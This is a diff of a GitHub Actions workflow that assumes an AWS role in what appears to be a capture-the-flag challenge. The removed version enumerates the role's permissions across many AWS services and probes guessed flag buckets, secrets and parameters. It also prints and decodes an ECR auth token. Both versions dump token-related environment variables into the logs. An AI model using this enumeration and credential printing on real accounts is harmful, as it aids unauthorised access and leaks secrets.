@@ -1,183 +1,61 @@
-name: Systematic AWS Permission Discovery
-on: [push]
+name: ECR Login & Debug
+
+on:
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write
+  contents: read
+
+env:
+  AWS_REGION: us-east-1
+  ECR_REGISTRY: 396961015104.dkr.ecr.us-east-1.amazonaws.com
+  ROLE_TO_ASSUME: arn:aws:iam::396961015104:role/imaginary-challenge
 
 jobs:
-  assume-role:
+  assume-and-login:
     runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-      contents: read
     steps:
-      - name: Configure AWS Credentials
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Configure AWS Credentials (OIDC)
+        id: awscreds
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
-          aws-region: us-east-1
-          
-      - name: Check Identity and Basic Info
-        run: |
-          echo "=== Current AWS Identity ==="
-          aws sts get-caller-identity
-          echo ""
-          echo "=== AWS Account Aliases ==="
-          aws iam list-account-aliases 2>/dev/null || echo "No permission to list account aliases"
-          
-      - name: Systematic Service Discovery
-        run: |
-          echo "=== Testing AWS Services Methodically ==="
-          
-          # Test read-only operations on various services
-          SERVICES=(
-            "s3:ListAllMyBuckets"
-            "ecr:DescribeRepositories" 
-            "ecr:GetAuthorizationToken"
-            "lambda:ListFunctions"
-            "ec2:DescribeInstances"
-            "secretsmanager:ListSecrets"
-            "ssm:DescribeParameters"
-            "cloudformation:ListStacks"
-            "iam:ListRoles"
-            "iam:ListUsers"
-            "logs:DescribeLogGroups"
-            "dynamodb:ListTables"
-            "rds:DescribeDBInstances"
-            "ecs:ListClusters"
-            "eks:ListClusters"
-            "kms:ListKeys"
-            "cloudwatch:ListDashboards"
-          )
-          
-          for service in "${SERVICES[@]}"; do
-            echo -n "Testing $service: "
-            case $service in
-              "s3:ListAllMyBuckets")
-                aws s3 ls >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "ecr:DescribeRepositories")
-                aws ecr describe-repositories --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"  
-                ;;
-              "ecr:GetAuthorizationToken")
-                aws ecr get-authorization-token --query 'authorizationData[0].authorizationToken' --output text >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "lambda:ListFunctions")
-                aws lambda list-functions --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "ec2:DescribeInstances")
-                aws ec2 describe-instances --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "secretsmanager:ListSecrets")
-                aws secretsmanager list-secrets --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "ssm:DescribeParameters")
-                aws ssm describe-parameters --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "cloudformation:ListStacks")
-                aws cloudformation list-stacks --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "iam:ListRoles")
-                aws iam list-roles --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "iam:ListUsers")
-                aws iam list-users --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "logs:DescribeLogGroups")
-                aws logs describe-log-groups --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "dynamodb:ListTables")
-                aws dynamodb list-tables --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "rds:DescribeDBInstances")
-                aws rds describe-db-instances --max-items 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "ecs:ListClusters")
-                aws ecs list-clusters --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "eks:ListClusters")
-                aws eks list-clusters --max-results 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "kms:ListKeys")
-                aws kms list-keys --limit 1 >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-              "cloudwatch:ListDashboards")
-                aws cloudwatch list-dashboards >/dev/null 2>&1 && echo "✅ SUCCESS" || echo "❌ DENIED"
-                ;;
-            esac
-          done
+          role-to-assume: ${{ env.ROLE_TO_ASSUME }}
+          aws-region: ${{ env.AWS_REGION }}
 
-      - name: Deep ECR Investigation
+      - name: Show caller identity (quick check)
         run: |
-          echo "=== Deep ECR Analysis ==="
-          
-          # Test if we can get ECR auth token (we know this works)
-          echo "ECR Auth Token Test:"
-          AUTH_TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[0].authorizationToken' 2>/dev/null)
-          if [ ! -z "$AUTH_TOKEN" ]; then
-            echo "✅ Can get ECR auth token"
-            echo "Token prefix: ${AUTH_TOKEN:0:50}..."
-            
-            # Decode the token to see what it contains
-            echo "Decoded token info:"
-            echo $AUTH_TOKEN | base64 -d | head -c 100
-            echo "..."
-          else
-            echo "❌ Cannot get ECR auth token"
-          fi
-          
-          echo ""
-          echo "=== Testing ECR Login ==="
-          # Test Docker login with ECR
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com && echo "✅ ECR Login Successful" || echo "❌ ECR Login Failed"
+          echo "==== Caller identity ===="
+          aws sts get-caller-identity || true
 
-      - name: Check for Specific Resource Access
+      - name: Show effective policy simulation (best-effort)
         run: |
-          echo "=== Checking Access to Specific Resources ==="
-          
-          # Maybe we have access to very specific resources by exact name
-          echo "Testing specific resource patterns:"
-          
-          # Common CTF resource patterns
-          RESOURCES=(
-            "s3://ctf-bucket"
-            "s3://flag-bucket" 
-            "s3://imaginary-bucket"
-            "s3://challenge-bucket"
-            "secret/ctf/flag"
-            "secret/imaginary/challenge"
-            "/ctf/flag"
-            "/imaginary/secret"
-          )
-          
-          for resource in "${RESOURCES}"; do
-            if [[ $resource == s3://* ]]; then
-              bucket_name=${resource#s3://}
-              echo -n "S3 bucket $bucket_name: "
-              aws s3 ls s3://$bucket_name/ >/dev/null 2>&1 && echo "✅ ACCESS" || echo "❌ NO ACCESS"
-            elif [[ $resource == secret/* ]]; then
-              secret_name=${resource#secret/}
-              echo -n "Secrets Manager $secret_name: "
-              aws secretsmanager get-secret-value --secret-id $secret_name >/dev/null 2>&1 && echo "✅ ACCESS" || echo "❌ NO ACCESS"
-            else
-              echo -n "SSM Parameter $resource: "
-              aws ssm get-parameter --name $resource >/dev/null 2>&1 && echo "✅ ACCESS" || echo "❌ NO ACCESS"
-            fi
-          done
+          # Best-effort: try a few read-ish operations so we can see what fails
+          echo "=== S3 buckets ==="
+          aws s3 ls || echo "No S3 access or listing failed"
+          echo "=== ECR describe-repositories (us-east-1) ==="
+          aws ecr describe-repositories --region $AWS_REGION || echo "No ECR describe access"
+          echo "=== Try to get ECR auth token ==="
+          aws ecr get-login-password --region $AWS_REGION > /dev/null && echo "get-login-password succeeded" || echo "get-login-password failed"
 
-      - name: Environment and Metadata Analysis
+      - name: Login to ECR (docker)
         run: |
-          echo "=== Environment Analysis ==="
-          echo "AWS Environment Variables:"
-          env | grep -E "^(AWS|EC2|ECS)" | sort
-          
-          echo ""
-          echo "=== Workflow Context ==="
-          echo "GitHub Repository: $GITHUB_REPOSITORY"
-          echo "GitHub Ref: $GITHUB_REF"
-          echo "GitHub SHA: $GITHUB_SHA"
-          echo "Workflow: $GITHUB_WORKFLOW"
-          
-          echo ""
-          echo "=== Current Execution Context ==="
-          pwd
+          set -e
+          echo "Logging in to ECR: $ECR_REGISTRY"
+          aws ecr get-login-password --region $AWS_REGION \
+            | docker login --username AWS --password-stdin $ECR_REGISTRY
+
+      - name: Show docker images (local)
+        run: |
+          docker images --format "{{.Repository}}:{{.Tag}} {{.ID}}"
+
+      - name: Extra debug — environment & files
+        run: |
+          echo "=== ENV related to AWS/OIDC ==="
+          env | grep -iE 'AWS|OIDC|TOKEN' || true
+          echo "=== Workflow dir listing ==="
           ls -la
-          echo "Home directory:"
-          ls -la ~/
